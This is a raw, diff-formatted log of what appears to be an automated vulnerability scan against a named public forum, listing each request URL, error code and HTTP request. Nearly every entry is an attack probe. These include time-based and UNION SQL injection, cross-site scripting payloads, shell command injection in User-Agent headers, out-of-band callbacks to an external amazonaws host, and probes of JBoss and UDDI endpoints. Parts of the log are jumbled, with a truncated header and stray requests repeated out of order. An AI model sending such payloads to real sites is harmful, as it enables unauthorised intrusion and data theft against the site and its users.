@@ -1,0 +1,573 @@
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 108
+
+keywords=mGT6N&c%5Busers%5D=xTM1O&_xfToken=1568804481%2C805b18f73d78df897b876c469c263fe0&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/invoker/JMXInvokerServlet?_xfClientLoadTime=Sxsiv
+error
+525
+
+GET https://kiwifarms.net/invoker/JMXInvokerServlet?_xfClientLoadTime=Sxsiv HTTP/1.1
+
+uri
+https://kiwifarms.net/invoker/JMXInvokerServlet?_xfClientLoadTime=FzJr1
+error
+525
+
+GET https://kiwifarms.net/invoker/JMXInvokerServlet?_xfClientLoadTime=FzJr1 HTTP/1.1
+
+uri
+https://kiwifarms.net/uddiexplorer
+error
+525
+
+GET https://kiwifarms.net/uddiexplorer HTTP/1.1
+
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 108
+
+keywords=MyZ9U&c%5Busers%5D=oeoyi&_xfToken=1568804482%2C7c8b30fc69ae05a2732461f9741a9c00&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/wsdl?_xfClientLoadTime=rWFHD
+error
+525
+
+GET https://kiwifarms.net/wsdl?_xfClientLoadTime=rWFHD HTTP/1.1
+
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 108
+
+keywords=uPMbf&c%5Busers%5D=4gvG1&_xfToken=1568804482%2C7c8b30fc69ae05a2732461f9741a9c00&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/webserviceclient+ssl?_xfClientLoadTime=pDZ3a
+error
+502
+
+GET https://kiwifarms.net/webserviceclient+ssl?_xfClientLoadTime=pDZ3a HTTP/1.1
+
+uri
+https://kiwifarms.net/wsdl?_xfClientLoadTime=UBkqL
+error
+525
+
+GET https://kiwifarms.net/wsdl?_xfClientLoadTime=UBkqL HTTP/1.1
+
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+
+keywords=Mkib0&_xfToken=1568804482%2C7c8b30fc69ae05a2732461f9741a9c00
+
+uri
+https://kiwifarms.net/wsil?_xfClientLoadTime=luQDB
+error
+502
+
+GET https://kiwifarms.net/wsil?_xfClientLoadTime=luQDB HTTP/1.1
+
+uri
+https://kiwifarms.net/uddigui
+error
+502
+
+GET https://kiwifarms.net/uddigui HTTP/1.1
+
+uri
+https://kiwifarms.net/search/?type=%3Cabc%20xmlns%3Axyz%3D'http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml'%3E%3Cxyz%3Abody%20onload%3D%22try(28T60)%22%2F%3E%3C%2Fabc%3E
+error
+520
+
+GET https://kiwifarms.net/search/?type=%3Cabc%20xmlns%3Axyz%3D'http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml'%3E%3Cxyz%3Abody%20onload%3D%22try(28T60)%22%2F%3E%3C%2Fabc%3E HTTP/1.1
+
+uri
+https://kiwifarms.net/search/?type=%2F%2Btry(p4LXz)%2B%2F
+error
+520
+
+GET https://kiwifarms.net/search/?type=%2F%2Btry(p4LXz)%2B%2F HTTP/1.1
+
+uri
+https://kiwifarms.net/search/?type='%2Btry(p4LXz)%2B'
+error
+520
+
+GET https://kiwifarms.net/search/?type='%2Btry(p4LXz)%2B' HTTP/1.1
+
+uri
+https://kiwifarms.net/search/?type=%0A''%2Btry(p4LXz)%2B''%3B%0A
+error
+520
+
+GET https://kiwifarms.net/search/?type=%0A''%2Btry(p4LXz)%2B''%3B%0A HTTP/1.1
+
+uri
+https://kiwifarms.net/search/?type='%20src%3D'nJT6n.js
+error
+520
+
+GET https://kiwifarms.net/search/?type='%20src%3D'nJT6n.js HTTP/1.1
+
+uri
+https://kiwifarms.net/uddilistener
+error
+502
+
+GET https://kiwifarms.net/uddilistener HTTP/1.1
+
+uri
+https://kiwifarms.net/svce
+error
+502
+
+GET https://kiwifarms.net/svce HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=--%3E%3CV3nCf%3E
+error
+520
+
+GET https://kiwifarms.net/css.php?css=--%3E%3CV3nCf%3E HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=%22%3E%3CV3nCf%3E
+error
+520
+
+GET https://kiwifarms.net/css.php?css=%22%3E%3CV3nCf%3E HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=V3nCf%20onerror%3Dtry(V3nCf)
+error
+520
+uri
+https://kiwifarms.net/css.php?css='%20UNION%20ALL%20SELECT%20CONCAT(0x4a%2C0x50%2C0x36%2C0x4e%2C0x38)%2CNULL%23
+error
+525
+
+GET https://kiwifarms.net/css.php?css='%20UNION%20ALL%20SELECT%20CONCAT(0x4a%2C0x50%2C0x36%2C0x4e%2C0x38)%2CNULL%23 HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css='%20UNION%20ALL%20SELECT%20CONCAT(0x4a%2C0x50%2C0x36%2C0x4e%2C0x38)%2CNULL%2CNULL%23
+error
+525
+
+GET https://kiwifarms.net/css.php?css='%20UNION%20ALL%20SELECT%20CONCAT(0x4a%2C0x50%2C0x36%2C0x4e%2C0x38)%2CNULL%2CNULL%23 HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=%60
+error
+502
+
+GET https://kiwifarms.net/css.php?css=%60 HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=public%253Anormalize.css%252Cpublic%253Acore.less%252Cpublic%253Aapp.less%26s%3D44%26l%3D1%26d%3D1568719603%26k%3D11c7ecdf59f92eef3e60d1dfc9c72254bf2ac58d%60
+error
+502
+
+GET https://kiwifarms.net/css.php?css=public%253Anormalize.css%252Cpublic%253Acore.less%252Cpublic%253Aapp.less%26s%3D44%26l%3D1%26d%3D1568719603%26k%3D11c7ecdf59f92eef3e60d1dfc9c72254bf2ac58d%60 HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=SELECT%20pg_sleep(25)
+error
+525
+
+GET https://kiwifarms.net/css.php?css=SELECT%20pg_sleep(25) HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css='))%3B%20SELECT%20pg_sleep(25)--
+error
+525
+
+GET https://kiwifarms.net/css.php?css='))%3B%20SELECT%20pg_sleep(25)-- HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=1))%3B%20SELECT%20pg_sleep(25)--
+error
+525
+
+GET https://kiwifarms.net/css.php?css=1))%3B%20SELECT%20pg_sleep(25)-- HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css=%22))%3B%20SELECT%20pg_sleep(25)--
+error
+525
+ri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+
+keywords=QYGMn&c%5Busers%5D=MvPVJ&_xfToken=%22%20onload%3D%22try(95Hab)&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 104
+
+keywords=)&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+520
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 104
+
+keywords=QYGMn&c%5Busers%5D='&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+520
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+
+keywords=%22)%3B%20SELECT%20pg_sleep(25)--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+
+keywords=QYGMn&c%5Busers%5D=MvPVJ)&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+520
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+keywords=1))%3B%20WAITFOR%20DELAY%20'00%3A00%3A25'--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+520
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+keywords='))%3B%20WAITFOR%20DELAY%20'00%3A00%3A25'--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+
+keywords=WAITFOR%20DELAY%20'00%3A00%3A25'&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+
+keywords='%2B(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2B'&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+
+keywords=-1'%20OR%201%3D(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2B'&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+keywords=(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 133
+
+keywords=1%3B%20SELECT%20pg_sleep(25)--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+520
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+
+keywords=%22&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 133
+
+keywords='%3B%20SELECT%20pg_sleep(25)--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+
+keywords=%22%3B%20SELECT%20pg_sleep(25)--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+525
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 134
+
+keywords=1)%3B%20SELECT%20pg_sleep(25)--&c%5Busers%5D=MvPVJ&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+
+keywords=QYGMn&c%5Busers%5D=MvPVJ%22&_xfToken=1568804481%2C10f30fcd3825dd5a3a39986c9731786f&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/search/search
+error
+502
+
+POST https://kiwifarms.net/search/search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+
+c%5Busers%5D=BosPR&keywords=&_xfToken=SELECT%20CONCAT(0x4f%2C0x4c%2C0x4b%2C0x55%2C0x69)--&c%5Btitle_only%5D=1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1)); SELECT pg_sleep(25)--
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: "); SELECT pg_sleep(25)--
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+520
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: '|echo 'm''o''g''D''g' |'
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+520
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: '&echo 'm''o''g''D''g'&'
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: HTTP://qnea6pjdk5.execute-api.eu-west-1.amazonaws.com/s/e/eyJib2R5IjoiPGp6YkJmLz4ifQ==
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: HTTPS://qnea6pjdk5.execute-api.eu-west-1.amazonaws.com/s/e/eyJib2R5IjoiPGp6YkJmLz4ifQ==
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1)); SELECT pg_sleep(25)--
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/members/
+error
+525
+
+GET https://kiwifarms.net/members/ HTTP/1.1
+Host: kiwifarms.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: HTTP://qnea6pjdk5.execute-api.eu-west-1.amazonaws.com/s/e/eyJib2R5IjoiPGp6YkJmLz4ifQ==
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+uri
+https://kiwifarms.net/webserviceclient+ssl?_xfClientLoadTime=%22%20src%3D%22eFbiI.js
+error
+520
+
+GET https://kiwifarms.net/webserviceclient+ssl?_xfClientLoadTime=%22%20src%3D%22eFbiI.js HTTP/1.1
+
+
+GET https://kiwifarms.net/css.php?css=%22))%3B%20SELECT%20pg_sleep(25)-- HTTP/1.1
+
+
+GET https://kiwifarms.net/css.php?css=V3nCf%20onerror%3Dtry(V3nCf) HTTP/1.1
+
+uri
+https://kiwifarms.net/css.php?css='%3E%3CV3nCf%3E
+error
+520
+
+GET https://kiwifarms.net/css.php?css='%3E%3CV3nCf%3E HTTP/1.1
+
